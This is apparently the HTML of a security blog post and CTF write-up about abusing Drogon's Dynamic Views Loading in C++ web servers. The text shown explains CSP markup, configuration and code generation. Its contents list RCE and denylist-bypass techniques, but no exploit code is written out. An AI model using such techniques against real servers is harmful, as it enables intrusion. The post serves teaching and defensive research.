<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Dynamic Views Loading – Abusing Server Side Rendering in Drogon - TrebledJ's Pages</title><meta name="description" content="What could go wrong releasing a C++ web server with &quot;live reload&quot; into the wild?"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="trebledj,dynamic views loading – abusing server side rendering in drogon,what could go wrong releasing a c++ web server with &amp;quot;live reload&amp;quot; into the wild?,infosec,cpp,ctf,web,programming,linux,notes,research,writeup"><meta name="robots" content="index,follow"><meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'sha256-Wv9Tjjg7Y7X5sBbP5AXqAQJA6+eewSRUjoPhNczfpnM=' 'sha256-FBtdNYnNdsvTKcrNIznI+jwGwhW3pNA5x/yQUw8jOPA=' 'sha256-5e8R4YC3Atf/5McNMkFk4TZYUtMEItdy9ikt1KUoPSc=' 'sha256-qlkNkQyGC5u9Brt4wwVi0MsPO/hVdrz3rzXuWYIkAbM=' 'sha256-yTzI3VRGCDLcTFnpTGf+BmZb880pS5QcpuzgQPwvBu4=' 'sha256-Deekn20h+++EarpL0nFQLX7JSJv7s/2W9f988ZFAh14=' comments.trebledj.me code.jquery.com cdn.jsdelivr.net gist.github.com static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' comments.trebledj.me cdn.jsdelivr.net cdnjs.cloudflare.com github.githubassets.com; font-src 'self' data: comments.trebledj.me cdn.jsdelivr.net cdnjs.cloudflare.com; img-src 'self' data: comments.trebledj.me; frame-src 'self' *.soundcloud.com; connect-src 'self' comments.trebledj.me wss://comments.trebledj.me cloudflareinsights.com formcarry.com;"><link href="/feeds/posts.xml" rel="alternate" title="RSS Feed for TrebledJ's Pages" type="application/rss+xml"><meta property="og:site_name" content="TrebledJ's Pages"><meta property="og:type" content="article"><meta property="og:title" content="Dynamic Views Loading – Abusing Server Side Rendering in Drogon - TrebledJ's Pages"><meta property="twitter:title" content="Dynamic Views Loading – Abusing Server Side Rendering in Drogon - TrebledJ's Pages"><meta property="og:description" content="What could go wrong releasing a C++ web server with &amp;quot;live reload&amp;quot; into the wild?

Earlier this month, I released two CTF web challenges for CrewCTF 2024: Nice View 1 and Nice View 2. These build upon an earlier challenge — an audio synthesis web..."><meta property="twitter:description" content="What could go wrong releasing a C++ web server with &amp;quot;live reload&amp;quot; into the wild?

Earlier this month, I released two CTF web challenges for CrewCTF 2024: Nice View 1 and Nice View 2. These build upon an earlier challenge — an audio synthesis web..."><meta property="og:url" content="https://trebledj.me/posts/abusing-server-side-rendering-in-drogon/"><meta name="twitter:card" content="summary_large_image"><meta property="og:image" content="https://trebledj.me/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1600w.webp"><meta property="twitter:image" content="https://trebledj.me/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1600w.webp"><meta property="article:published_time" content="2024-08-18T00:00:00.000Z"><meta property="article:author" content="TrebledJ"><meta property="article:section" content="cybersecurity"><meta property="article:tag" content="infosec"><meta property="article:tag" content="cpp"><meta property="article:tag" content="ctf"><meta property="article:tag" content="web"><meta property="article:tag" content="programming"><meta property="article:tag" content="linux"><meta property="article:tag" content="notes"><meta property="article:tag" content="research"><meta property="article:tag" content="writeup"><script type="application/ld+json">{"@context": "https://schema.org","@type": "WebSite","name": "TrebledJ's Pages","url": "https://trebledj.me"}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/cb/css/icons-6e60ae6c5e022aba.css"><link rel="stylesheet" href="/cb/x2ljFSZBUH.css" media="print"><style></style><script>document.querySelectorAll('link[media|="print"]').forEach(e=>{e.addEventListener("load",()=>e.media="all"),e.sheet&&(e.media="all")})</script><script>const defaultTheme="dark";let icon=void 0;var reloadDisqus=void 0;function modeInit(){var e=localStorage.getItem("theme");setMode("dark"===e?"dark":"light"===e?"light":defaultTheme)}function modeInitIcon(){icon=document.getElementById("mode-switch-icon"),isLightTheme()&&(icon.classList.remove("fa-moon"),icon.classList.add("fa-sun"),icon.classList.add("mode-switch-transform"))}function isLightTheme(){return"light"===localStorage.getItem("theme")}function modeSwitcher(){var e=localStorage.getItem("theme");"dark"===e?(setMode("light"),reloadDisqus&&reloadDisqus()):"light"===e?(setMode("dark"),reloadDisqus&&reloadDisqus()):setMode(defaultTheme)}function setMode(e){"dark"===e?(document.documentElement.setAttribute("data-theme","dark"),localStorage.setItem("theme","dark")):"light"===e&&(document.documentElement.setAttribute("data-theme","light"),localStorage.setItem("theme","light")),icon&&(icon.classList.toggle("fa-moon"),icon.classList.toggle("fa-sun"),icon.classList.toggle("mode-switch-transform"))}modeInit(),document.addEventListener("DOMContentLoaded",()=>{document.getElementById("mode-switch").addEventListener("click",()=>{modeSwitcher()})})</script><script defer src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"><link rel="stylesheet" href="/css/comments.css"><link rel="icon" href="/favicon.ico" type="image/x-icon"></head><body><header><nav class="navbar navbar-expand-md py-2"><div class="container-fluid justify-content-between align-items-center"><button aria-controls="navbar-container" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler shadow-none" data-bs-target="#navbar-container" data-bs-toggle="collapse" type="button"><span id="navbar-toggler-icon"><i class="fas fa-bars"></i></span></button> <a class="navbar-brand no-decoration" href="/">TrebledJ's Pages</a><div class="navbar-collapse collapse" id="navbar-container"><ul class="navbar-nav me-auto"><li class="nav-item"><a class="nav-link" href="/">Home</a></li><li class="nav-item"><a class="nav-link" href="/about">About</a></li><li class="nav-item"><a class="nav-link" href="/posts">Posts</a></li><li class="nav-item"><a class="nav-link" href="/music">Music</a></li></ul><ul class="navbar-nav"><li><a class="nav-link me-2" data-bs-toggle="modal" data-bs-target="#search-modal" aria-label="Search..." role="button"><i class="fas fa-search nav-icon"></i></a></li><li><a class="nav-link" id="mode-switch" aria-label="Theme Switch" role="button"><i id="mode-switch-icon" class="fas fa-moon nav-icon"></i></a><script>modeInitIcon()</script></li></ul></div></div></nav><div id="scroll-progress-bar"></div></header><div id="top-of-the-morning-to-you"></div><div id="search-modal" class="modal fade wide-modal" aria-hidden="true" aria-label="Search" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header pb-2 d-flex flex-row justify-content-between"><div class="container-fluid ps-0" id="search-box-container"><input type="text" autofocus class="container-fluid" id="search-box" placeholder="Search"> <i class="fas fa-search"></i></div><button aria-label="Close" class="btn-close" data-bs-dismiss="modal" type="button"></button></div><div class="modal-body" id="search-results-list"></div></div></div></div><button id="btn-back-to-top" class="btn btn-lg" type="button" aria-label="Back to Top"><i class="fas fa-arrow-up"></i></button><div id="btn-mobile-toc" class="dropup"><button type="button" class="btn btn-lg" data-bs-toggle="dropdown" aria-label="Content"><i class="fas fa-list-ul"></i></button><ul class="dropdown-menu toc-container"><li><nav class="toc"><ol><li><a href="#drogon-redux">Drogon Redux</a><ol><li><a href="#simple-view-example">Simple View Example</a></li><li><a href="#why-use-dynamic-views">Why Use Dynamic Views?</a></li><li><a href="#dynamic-views-compilation-and-loading">Dynamic Views: Compilation and Loading</a></li><li><a href="#from-csp-markup-to-c">From CSP Markup to C++</a></li></ol></li><li><a href="#attack-vectors">Attack Vectors</a><ol><li><a href="#1-rce-via-rendered-csp">1. RCE via Rendered CSP</a></li><li><a href="#2-bypassing-simple-denylists">2. Bypassing Simple Denylists</a><ol><li><a href="#file-read-write-with-fstream-fopen">File Read/Write with fstream, fopen</a></li><li><a href="#file-read-write-with-open-read">File Read/Write with open, read</a></li><li><a href="#file-read-write-rce-with-syscall">File Read/Write, RCE with syscall</a></li><li><a href="#file-read-with-mmap">File Read with mmap</a></li><li><a href="#file-read-write-rce-via-inline-assembly">File Read/Write, RCE via Inline Assembly</a></li><li><a href="#local-file-inclusion-with-include">Local File Inclusion with include</a></li><li><a href="#bypass-denylists-with-macro-token-concatenation">Bypass Denylists with Macro Token Concatenation (##)</a></li></ol></li><li><a href="#3-rce-via-init-section">3. RCE via Init Section</a><ol><li><a href="#init-section-via-inc">Init Section via &lt;%inc</a></li><li><a href="#escaping-function-scope-with-c-and">Escaping Function Scope with &lt;%c++ and [[</a></li></ol></li><li><a href="#4-rce-via-file-name">4. RCE via File Name</a></li></ol></li><li><a href="#takeaways-and-mitigations">Takeaways and Mitigations</a></li><li><a href="#conclusion">Conclusion</a></li></ol></nav></li></ul></div><div class="main-container"><div class="page-container col-lg-12"><div class="container-lg px-0"><article class="jw-100 post-article" itemscope itemtype="http://schema.org/BlogPosting"><div class="row flex-row-reverse gx-lg-5"><div class="col-lg-4 d-none d-lg-block"><div class="dim-deep"><div class="metadata-container d-flex"><div class="d-flex flex-row align-items-center"><span><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-posted-date">Posted on <span itemprop="datePublished" content="2024-08-18T08:00:00.000+08:00">2024‑08‑18</span></span></div><div class="d-flex flex-row align-items-center"><span class="post-updated-date-icon"><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-updated-date">Updated on <span itemprop="dateModified" content="2024-11-01T12:47:25.000+08:00">2024‑11‑01</span></span></div><div class="d-flex flex-row align-items-center"><span><i class="far fa-clock post-meta-icon me-1"></i> </span><span class="fs-7">11 minute read</span></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><span><i class="fas fa-tag post-meta-icon me-1 mt-2"></i></span><div class="tag-list d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/cpp/" itemprop="keywords">cpp</a> </span><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/web/" itemprop="keywords">web</a> </span><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/linux/" itemprop="keywords">linux</a> </span><span><a class="jtag" href="/tags/notes/" itemprop="keywords">notes</a> </span><span><a class="jtag" href="/tags/research/" itemprop="keywords">research</a> </span><span><a class="jtag" href="/tags/writeup/" itemprop="keywords">writeup</a></span></div></div></div><br><div id="toc-sidebar" class="sticky-right dim-deep dim-if-dark"><div class="toc-container"><span><a id="toc-content" href="javascript:void(0);">Content</a></span><nav class="toc"><ol><li><a href="#drogon-redux">Drogon Redux</a><ol><li><a href="#simple-view-example">Simple View Example</a></li><li><a href="#why-use-dynamic-views">Why Use Dynamic Views?</a></li><li><a href="#dynamic-views-compilation-and-loading">Dynamic Views: Compilation and Loading</a></li><li><a href="#from-csp-markup-to-c">From CSP Markup to C++</a></li></ol></li><li><a href="#attack-vectors">Attack Vectors</a><ol><li><a href="#1-rce-via-rendered-csp">1. RCE via Rendered CSP</a></li><li><a href="#2-bypassing-simple-denylists">2. Bypassing Simple Denylists</a><ol><li><a href="#file-read-write-with-fstream-fopen">File Read/Write with fstream, fopen</a></li><li><a href="#file-read-write-with-open-read">File Read/Write with open, read</a></li><li><a href="#file-read-write-rce-with-syscall">File Read/Write, RCE with syscall</a></li><li><a href="#file-read-with-mmap">File Read with mmap</a></li><li><a href="#file-read-write-rce-via-inline-assembly">File Read/Write, RCE via Inline Assembly</a></li><li><a href="#local-file-inclusion-with-include">Local File Inclusion with include</a></li><li><a href="#bypass-denylists-with-macro-token-concatenation">Bypass Denylists with Macro Token Concatenation (##)</a></li></ol></li><li><a href="#3-rce-via-init-section">3. RCE via Init Section</a><ol><li><a href="#init-section-via-inc">Init Section via &lt;%inc</a></li><li><a href="#escaping-function-scope-with-c-and">Escaping Function Scope with &lt;%c++ and [[</a></li></ol></li><li><a href="#4-rce-via-file-name">4. RCE via File Name</a></li></ol></li><li><a href="#takeaways-and-mitigations">Takeaways and Mitigations</a></li><li><a href="#conclusion">Conclusion</a></li></ol></nav><hr></div><div class="toc-link-container"><span><a href="#related">Related Posts</a></span></div><div class="toc-link-container"><span><a href="#comments">Comments</a></span></div></div></div><div class="col-lg-8 post-body-container"><div class="article-header"><h1 class="post-title" itemprop="name headline">Dynamic Views Loading – Abusing Server Side Rendering in Drogon</h1><p class="post-desc" itemprop="alternativeHeadline">What could go wrong releasing a C++ web server with "live reload" into the wild?</p><div class="d-lg-none dim-deep"><div class="metadata-container d-flex"><div class="d-flex flex-row align-items-center"><span><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-posted-date">Posted on <span itemprop="datePublished" content="2024-08-18T08:00:00.000+08:00">2024‑08‑18</span></span></div><div class="d-flex flex-row align-items-center"><span class="post-updated-date-icon"><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-updated-date">Updated on <span itemprop="dateModified" content="2024-11-01T12:47:25.000+08:00">2024‑11‑01</span></span></div><div class="d-flex flex-row align-items-center"><span><i class="far fa-clock post-meta-icon me-1"></i> </span><span class="fs-7">11 minute read</span></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><span><i class="fas fa-tag post-meta-icon me-1 mt-2"></i></span><div class="tag-list d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/cpp/" itemprop="keywords">cpp</a> </span><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/web/" itemprop="keywords">web</a> </span><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/linux/" itemprop="keywords">linux</a> </span><span><a class="jtag" href="/tags/notes/" itemprop="keywords">notes</a> </span><span><a class="jtag" href="/tags/research/" itemprop="keywords">research</a> </span><span><a class="jtag" href="/tags/writeup/" itemprop="keywords">writeup</a></span></div></div></div></div><hr><div class="post-body text-content" itemprop="articleBody text"><img class="mb-2 rw center jw-100" src="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1600w.webp" loading="eager" decoding="async" style="aspect-ratio: auto 1600 / 900" alt="Dynamic Views Loading – Abusing Server Side Rendering in Drogon" title="Dynamic Views Loading – Abusing Server Side Rendering in Drogon" srcset="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-256w.webp 256w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-512w.webp 512w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1024w.webp 1024w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1600w.webp 1600w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1600px"><p>Earlier this month, I released two CTF web challenges for CrewCTF 2024: Nice View 1 and Nice View 2. These build upon an earlier challenge — an audio synthesis web service running on the Drogon Web Framework. This time, our focus shifts from <a href="/posts/attack-of-the-zip/">exploring zip attacks in Juce</a> to <strong>exploring an alarming configuration in Drogon: Dynamic Views Loading</strong> (hereafter abbreviated DVL).</p><p>In a hypothetical situation where a Drogon server with DVL is exposed to hackers, how many holes can be poked? What attack vectors can be achieved?<sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup></p><p>At the same time, this is also a good exercise in defensive programming. If we released such a server, what (programming) defences are necessary to cover our sorry arse? When and where should we apply sanitisation and filtering? How do we properly allow “safe” programs? Is that even possible to begin with?</p><p>This turned out to be a fascinating endeavour, as there happen to be a <em>ton</em> of ways to compromise a vulnerable DVL-enabled server. In the making of the CTF challenges, I struggled to eliminate every single unintended solution.</p><p><a class="lightbox-single" title="Every time I find an unintended solution, a new one is just around the corner." href="/img/posts/infosec/drogon-csp/assets/craft-a-ctf-web-chal-666w.webp"><img class="mb-2 rw center jw-60" src="/img/posts/infosec/drogon-csp/assets/craft-a-ctf-web-chal-666w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 666 / 500" alt="Every time I find an unintended solution, a new one is just around the corner." title="Every time I find an unintended solution, a new one is just around the corner." srcset="/img/posts/infosec/drogon-csp/assets/craft-a-ctf-web-chal-256w.webp 256w, /img/posts/infosec/drogon-csp/assets/craft-a-ctf-web-chal-512w.webp 512w, /img/posts/infosec/drogon-csp/assets/craft-a-ctf-web-chal-666w.webp 666w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 666px"></a></p><p class="caption"><sup>Every time I find an unintended solution, a new one is just around the corner.</sup></p><h2 id="drogon-redux" tabindex="-1"><a class="md-anchor" href="#drogon-redux" aria-hidden="true"></a> Drogon Redux</h2><p><a href="https://github.com/drogonframework/drogon" rel="noreferrer" target="_blank">Drogon</a> is a C++ web framework built with C++17, containing a whole slew of features such as session handling, server side rendering, and websockets —&nbsp;features you would expect in a modern web framework.</p><p>Drogon's server side rendering is handled by CSP views (C++ Server Pages). Similar to ASP, JSP, PHP, and other HTML templates, these files are sprinkled with special markup such as <code>&lt;%inc ... %&gt;</code>, <code>&lt;%c++ ... %&gt;</code>, and <code>{% ... %}</code>, which are evaluated when rendered.</p><h3 id="simple-view-example" tabindex="-1"><a class="md-anchor" href="#simple-view-example" aria-hidden="true"></a> Simple View Example</h3><p>Here's a simple example of a CSP:</p><div class="code-toolbar"><pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Hi <span class="token punctuation">[</span><span class="token punctuation">[</span> name <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Bye <span class="token punctuation">[</span><span class="token punctuation">[</span> name <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Example.csp</span></div><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>We can specify C++ control-flow logic with <code>&lt;%c++ ... %&gt;</code> and substitute variables with <code>[[ ... ]]</code>.</p><p>To render this file, we'll call <code>newHttpViewResponse</code> and pass a <code>name</code> from the URL endpoint:</p><div class="code-toolbar"><pre data-label="main.cpp" class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token function">app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">registerHandler</span><span class="token punctuation">(</span>
    <span class="token string">"/hello/{}"</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">const</span> HttpRequestPtr<span class="token operator">&amp;</span> req<span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">const</span> HttpResponsePtr<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&amp;&amp;</span> callback<span class="token punctuation">,</span> <span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>string<span class="token operator">&amp;</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        HttpViewData data<span class="token punctuation">;</span>
        data<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> resp <span class="token operator">=</span> <span class="token class-name">HttpResponse</span><span class="token double-colon punctuation">::</span><span class="token function">newHttpViewResponse</span><span class="token punctuation">(</span><span class="token string">"Example.csp"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">callback</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>main.cpp</span></div><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>After starting the server, we can run <code>curl 127.0.0.1:8080/hello/Picard</code> and observe the following HTML:</p><div class="code-toolbar"><pre data-copy-off="" class="language-html" tabindex="0"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Hi Picard<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">HTML</span></div></div></div><h3 id="why-use-dynamic-views" tabindex="-1"><a class="md-anchor" href="#why-use-dynamic-views" aria-hidden="true"></a> Why Use Dynamic Views?</h3><p>This is all very nice, until our application becomes a gargantuan, unwieldy mess. What if we want to fine-tune some HTML? Each minor change takes a full minute to recompile. Dynamically-typed, scripting languages with hot-reload suddenly look more appealing.</p><p>To address this, Drogon supports dynamic loading of views. New CSP files added to a target directory will be automagically compiled and loaded. To enable Dynamic Views Loading, we can add the following lines to our JSON configuration:</p><div class="code-toolbar"><pre class="language-json" tabindex="0"><code class="language-json"><span class="token property">"load_dynamic_views"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
<span class="token property">"dynamic_views_path"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"./views/d"</span><span class="token punctuation">]</span><span class="token punctuation">,</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">JSON</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>or use the C++ equivalent:</p><div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token function">app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">enableDynamicViewsLoading</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"./views/d"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"./views/d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Drogon will then actively monitor the file path for new/modified .csp files.</p><h3 id="dynamic-views-compilation-and-loading" tabindex="-1"><a class="md-anchor" href="#dynamic-views-compilation-and-loading" aria-hidden="true"></a> Dynamic Views: Compilation and Loading</h3><p>How do dynamic views work in Drogon?</p><p>After all, C++ is compiled, not interpreted.</p><p>But it's possible to load compiled code at runtime through <a href="https://en.wikipedia.org/wiki/Shared_library" rel="noreferrer" target="_blank">shared objects</a>. These are specially-compiled files which can be loaded on-the-fly. In Drogon, the process goes like so:</p><p><a class="lightbox-single" title="Flow Chart of Dynamic Views Loading" href="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-404w.webp"><img class="mb-2 rw center jw-50 alpha-imgv" src="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-404w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 404 / 412" alt="Flow Chart of Dynamic Views Loading" title="Flow Chart of Dynamic Views Loading" srcset="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-256w.webp 256w, /img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-404w.webp 404w" sizes="(max-width: 256px) 256px, 404px"></a></p><p class="caption"><sup>Flow Chart of Dynamic Views Loading</sup></p><ol><li>The user writes a .csp file to the dynamic view path. The rest is up to Drogon.</li><li>Drogon detects the new/modified .csp files.</li><li>Drogon translates the .csp to a regular C++ .h and .cc file, using the <code>drogon_ctl</code> command-line tool.</li><li>The .cc is compiled into a shared object (.so) using the <code>-shared</code> flag.</li><li>The .so is loaded with <code>dlopen</code>, after previous versions are unloaded with <code>dlclose</code>.<sup class="footnote-ref"><a href="#fn2" id="fnref2">2</a></sup></li><li>The new/updated view can now be used in application code.</li></ol><p>All of this happens in <a href="https://github.com/drogonframework/drogon/blob/637046189653ea22e6c4b13d7f47023170fa01b1/lib/src/SharedLibManager.cc" rel="noreferrer" target="_blank">SharedLibManager.cc</a>. Feel free to take a gander.</p><h3 id="from-csp-markup-to-c" tabindex="-1"><a class="md-anchor" href="#from-csp-markup-to-c" aria-hidden="true"></a> From CSP Markup to C++</h3><p>Another natural question to ask is: how is CSP markup converted in C++ source code and compiled?</p><p>This is quite an important question, since it affects how we can inject code, and the defensive measures needed. We can analyse this by running...</p><div class="code-toolbar"><pre class="language-sh" tabindex="0"><code class="language-sh">drogon_ctl create view Example.csp</code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Shell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>which generates Example.h and Example.cc.</p><p>Let's look at how C++ is generated from markup.</p><ul><li><p><code>&lt;%c++ ... %&gt;</code> - content inside this tag is inserted into a <code>genText()</code> function.</p><div class="code-toolbar"><pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Example<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span> <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span> $$ <span class="token operator">&lt;&lt;</span> a<span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>h2<span class="token operator">&gt;</span>Hello world<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Example.csp</span></div><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><div class="code-toolbar"><pre data-label="Example.cc" data-copy-off="" class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// Boilerplate: includes...</span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> drogon<span class="token punctuation">;</span>
std<span class="token double-colon punctuation">::</span>string <span class="token class-name">Example</span><span class="token double-colon punctuation">::</span><span class="token function">genText</span><span class="token punctuation">(</span><span class="token keyword">const</span> DrTemplateData<span class="token operator">&amp;</span> Example_view_data<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    drogon<span class="token double-colon punctuation">::</span>OStringStream Example_tmp_stream<span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>string layoutName<span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    Example_tmp_stream <span class="token operator">&lt;&lt;</span> <span class="token string">"&lt;h1&gt;Example&lt;/h1&gt;\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span> Example_tmp_stream <span class="token operator">&lt;&lt;</span> a<span class="token punctuation">;</span> 
    Example_tmp_stream <span class="token operator">&lt;&lt;</span> <span class="token string">"&lt;h2&gt;Hello world!&lt;/h2&gt;\n"</span><span class="token punctuation">;</span>
    <span class="token comment">// Boilerplate: convert stream to string and return...</span>
